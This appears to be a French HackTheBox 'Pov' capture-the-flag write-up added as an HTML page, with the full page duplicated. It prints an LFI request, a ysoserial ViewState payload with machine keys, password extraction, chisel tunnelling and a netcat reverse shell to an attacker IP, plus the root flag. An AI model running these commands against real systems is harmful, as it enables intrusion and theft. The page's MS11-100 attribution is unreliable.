@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Pov - Write-up Expert | Cyberdéfense</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Consolas', 'Courier New', monospace; line-height: 1.6; color: #e0e0e0; background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%); min-height: 100vh; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        header { text-align: center; background: rgba(0,0,0,0.8); border: 2px solid #00ff88; border-radius: 10px; padding: 30px; margin-bottom: 40px; box-shadow: 0 0 20px #00ff88; }
+        h1 { color: #00ff88; font-size: 2.5em; text-shadow: 0 0 10px #00ff88; margin-bottom: 10px; }
+        .info { display: flex; justify-content: center; gap: 30px; font-size: 1.1em; }
+        .info span { background: rgba(0,255,136,0.1); padding: 10px 20px; border-radius: 20px; border: 1px solid #00ff88; }
+        section { background: rgba(0,0,0,0.6); margin-bottom: 30px; border-radius: 15px; padding: 25px; border-left: 5px solid #00ff88; box-shadow: 0 5px 15px rgba(0,255,136,0.2); }
+        h2 { color: #00ff88; font-size: 1.8em; margin-bottom: 20px; border-bottom: 2px solid #00ff88; padding-bottom: 10px; }
+        pre { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 20px; overflow-x: auto; font-size: 0.95em; margin: 15px 0; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }
+        code { background: #2d2d2d; padding: 2px 6px; border-radius: 4px; color: #00ff88; }
+        ul { list-style: none; padding-left: 0; }
+        li { margin: 10px 0; padding: 10px; background: rgba(0,255,136,0.05); border-left: 3px solid #00ff88; padding-left: 15px; }
+        .flag { background: linear-gradient(45deg, #ff0000, #ff6600); color: white; font-weight: bold; padding: 15px; border-radius: 8px; text-align: center; font-size: 1.2em; margin: 20px 0; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
+        .highlight { background: rgba(0,255,136,0.2); padding: 10px; border-radius: 5px; margin: 10px 0; }
+        footer { text-align: center; margin-top: 50px; padding: 20px; color: #888; border-top: 1px solid #333; }
+        @media (max-width: 768px) { .info { flex-direction: column; gap: 10px; } h1 { font-size: 2em; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔥 HTB Pov - Write-up Expert</h1>
+            <div class="info">
+                <span>Medium • Windows • IIS ViewState RCE</span>
+                <span>Daouda Togola • INSA Cyberdéfense M2</span>
+                <span>23/02/2026</span>
+            </div>
+        </header>
+
+        <section id="recon">
+            <h2>📡 Reconnaissance Initiale</h2>
+            <p>Scan Nmap identifie IIS 10.0 sur port 80/tcp (TRACE risky). Gobuster vhost leak <code>dev.pov.htb</code> → /portfolio/ vulnérable.<br>
+            Ajout hosts : <code>10.129.230.183 pov.htb dev.pov.htb</code>.</p>
+            <pre><code>ports=$(nmap -p- --min-rate=1000 -T4 10.129.230.183 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
+nmap -p$ports -sC -sV 10.129.230.183</code></pre>
+        </section>
+
+        <section id="enum">
+            <h2>🔍 Énumération Web</h2>
+            <p>Formulaire POST /portfolio/ leak <code>web.config</code> via LFI (<code>file=../web.config</code>). MachineKey exposée (AES decryptionKey, SHA1 validationKey).</p>
+            <div class="highlight">Vuln : VIEWSTATE sans HMAC safe → Désérialisation insecure.</div>
+            <pre><code>POST /portfolio/ HTTP/1.1
+Host: dev.pov.htb
+__EVENTTARGET=download&file=../web.config</code></pre>
+        </section>
+
+        <section id="rce">
+            <h2>💥 RCE via ViewState</h2>
+            <p>Ysoserial gadget <code>TextFormattingRunProperties</code> → Reverse shell <code>pov\sfitz</code> sur nc 9001.</p>
+            <pre><code>ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell iex ... -Port 9001" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"</code></pre>
+            <div class="highlight">Shell : <code>PS C:\windows\system32\inetsrv> whoami → pov\sfitz</code></div>
+        </section>
+
+        <section id="user">
+            <h2>👤 Accès alaading</h2>
+            <p><code>C:\users\sfitz\Documents\connection.xml</code> → PSCredential leak pass <code>f8gQ8fynP44ek1m3</code>.</p>
+            <pre><code>$cred = Import-Clixml C:\Users\sfitz\Documents\connection.xml
+$cred.GetNetworkCredential().Password</code></pre>
+        </section>
+
+        <section id="pivot">
+            <h2>🔄 Pivoting Chisel + WinRM</h2>
+            <p>Tunnel SOCKS : Serveur <code>chisel server --reverse -p 8000</code>. Client : <code>chisel.exe client 10.10.14.155:80 R:socks</code>.<br>
+            <code>proxychains evil-winrm -i pov.htb -u alaading -p f8gQ8fynP44ek1m3</code>. SeDebugPrivilege enabled.</p>
+        </section>
+
+        <section id="privesc">
+            <h2>🚀 Privesc → SYSTEM</h2>
+            <p>psgetsys abuse SeDebug sur winlogon PID → Token duplication. Upload nc64.exe + exec reverse 9001.</p>
+            <pre><code>ipmo .\psgetsys.ps1
+ImpersonateFromParentPid -ppid 564 -command "cmd.exe" -cmdargs "/c nc64.exe 10.10.14.155 9001 -e powershell"</code></pre>
+            <div class="flag">Root Flag: <code>cd4c2be0a3751294fddb5a4c184a0975</code></div>
+        </section>
+
+        <section id="lessons">
+            <h2>📚 Key Takeaways</h2>
+            <ul>
+                <li>ViewState deserialization (MS11-100) → Priorisez web.config leaks.</li>
+                <li>PSCredential XML creds → Toujours énum docs users.</li>
+                <li>SeDebugPrivilege → psgetsys gold pour Windows LPE.</li>
+                <li>Chisel > Proxychains pour pivots HTB WinRM.</li>
+            </ul>
+        </section>
+
+        <footer>
+            <p>Write-up par Daouda Togola | Master 2 Cyberdéfense INSA | Sources: HTB, ysoserial.net</p>
+        </footer>
+    </div>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Pov - Write-up Expert | Cyberdéfense</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Consolas', 'Courier New', monospace; line-height: 1.6; color: #e0e0e0; background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%); min-height: 100vh; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
+        header { text-align: center; background: rgba(0,0,0,0.8); border: 2px solid #00ff88; border-radius: 10px; padding: 30px; margin-bottom: 40px; box-shadow: 0 0 20px #00ff88; }
+        h1 { color: #00ff88; font-size: 2.5em; text-shadow: 0 0 10px #00ff88; margin-bottom: 10px; }
+        .info { display: flex; justify-content: center; gap: 30px; font-size: 1.1em; }
+        .info span { background: rgba(0,255,136,0.1); padding: 10px 20px; border-radius: 20px; border: 1px solid #00ff88; }
+        section { background: rgba(0,0,0,0.6); margin-bottom: 30px; border-radius: 15px; padding: 25px; border-left: 5px solid #00ff88; box-shadow: 0 5px 15px rgba(0,255,136,0.2); }
+        h2 { color: #00ff88; font-size: 1.8em; margin-bottom: 20px; border-bottom: 2px solid #00ff88; padding-bottom: 10px; }
+        pre { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 20px; overflow-x: auto; font-size: 0.95em; margin: 15px 0; box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }
+        code { background: #2d2d2d; padding: 2px 6px; border-radius: 4px; color: #00ff88; }
+        ul { list-style: none; padding-left: 0; }
+        li { margin: 10px 0; padding: 10px; background: rgba(0,255,136,0.05); border-left: 3px solid #00ff88; padding-left: 15px; }
+        .flag { background: linear-gradient(45deg, #ff0000, #ff6600); color: white; font-weight: bold; padding: 15px; border-radius: 8px; text-align: center; font-size: 1.2em; margin: 20px 0; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
+        .highlight { background: rgba(0,255,136,0.2); padding: 10px; border-radius: 5px; margin: 10px 0; }
+        footer { text-align: center; margin-top: 50px; padding: 20px; color: #888; border-top: 1px solid #333; }
+        @media (max-width: 768px) { .info { flex-direction: column; gap: 10px; } h1 { font-size: 2em; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔥 HTB Pov - Write-up Expert</h1>
+            <div class="info">
+                <span>Medium • Windows • IIS ViewState RCE</span>
+                <span>Daouda Togola • INSA Cyberdéfense M2</span>
+                <span>23/02/2026</span>
+            </div>
+        </header>
+
+        <section id="recon">
+            <h2>📡 Reconnaissance Initiale</h2>
+            <p>Scan Nmap identifie IIS 10.0 sur port 80/tcp (TRACE risky). Gobuster vhost leak <code>dev.pov.htb</code> → /portfolio/ vulnérable.<br>
+            Ajout hosts : <code>10.129.230.183 pov.htb dev.pov.htb</code>.</p>
+            <pre><code>ports=$(nmap -p- --min-rate=1000 -T4 10.129.230.183 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
+nmap -p$ports -sC -sV 10.129.230.183</code></pre>
+        </section>
+
+        <section id="enum">
+            <h2>🔍 Énumération Web</h2>
+            <p>Formulaire POST /portfolio/ leak <code>web.config</code> via LFI (<code>file=../web.config</code>). MachineKey exposée (AES decryptionKey, SHA1 validationKey).</p>
+            <div class="highlight">Vuln : VIEWSTATE sans HMAC safe → Désérialisation insecure.</div>
+            <pre><code>POST /portfolio/ HTTP/1.1
+Host: dev.pov.htb
+__EVENTTARGET=download&file=../web.config</code></pre>
+        </section>
+
+        <section id="rce">
+            <h2>💥 RCE via ViewState</h2>
+            <p>Ysoserial gadget <code>TextFormattingRunProperties</code> → Reverse shell <code>pov\sfitz</code> sur nc 9001.</p>
+            <pre><code>ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell iex ... -Port 9001" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"</code></pre>
+            <div class="highlight">Shell : <code>PS C:\windows\system32\inetsrv> whoami → pov\sfitz</code></div>
+        </section>
+
+        <section id="user">
+            <h2>👤 Accès alaading</h2>
+            <p><code>C:\users\sfitz\Documents\connection.xml</code> → PSCredential leak pass <code>f8gQ8fynP44ek1m3</code>.</p>
+            <pre><code>$cred = Import-Clixml C:\Users\sfitz\Documents\connection.xml
+$cred.GetNetworkCredential().Password</code></pre>
+        </section>
+
+        <section id="pivot">
+            <h2>🔄 Pivoting Chisel + WinRM</h2>
+            <p>Tunnel SOCKS : Serveur <code>chisel server --reverse -p 8000</code>. Client : <code>chisel.exe client 10.10.14.155:80 R:socks</code>.<br>
+            <code>proxychains evil-winrm -i pov.htb -u alaading -p f8gQ8fynP44ek1m3</code>. SeDebugPrivilege enabled.</p>
+        </section>
+
+        <section id="privesc">
+            <h2>🚀 Privesc → SYSTEM</h2>
+            <p>psgetsys abuse SeDebug sur winlogon PID → Token duplication. Upload nc64.exe + exec reverse 9001.</p>
+            <pre><code>ipmo .\psgetsys.ps1
+ImpersonateFromParentPid -ppid 564 -command "cmd.exe" -cmdargs "/c nc64.exe 10.10.14.155 9001 -e powershell"</code></pre>
+            <div class="flag">Root Flag: <code>cd4c2be0a3751294fddb5a4c184a0975</code></div>
+        </section>
+
+        <section id="lessons">
+            <h2>📚 Key Takeaways</h2>
+            <ul>
+                <li>ViewState deserialization (MS11-100) → Priorisez web.config leaks.</li>
+                <li>PSCredential XML creds → Toujours énum docs users.</li>
+                <li>SeDebugPrivilege → psgetsys gold pour Windows LPE.</li>
+                <li>Chisel > Proxychains pour pivots HTB WinRM.</li>
+            </ul>
+        </section>
+
+        <footer>
+            <p>Write-up par Daouda Togola | Master 2 Cyberdéfense INSA | Sources: HTB, ysoserial.net</p>
+        </footer>
+    </div>
+</body>
+</html>
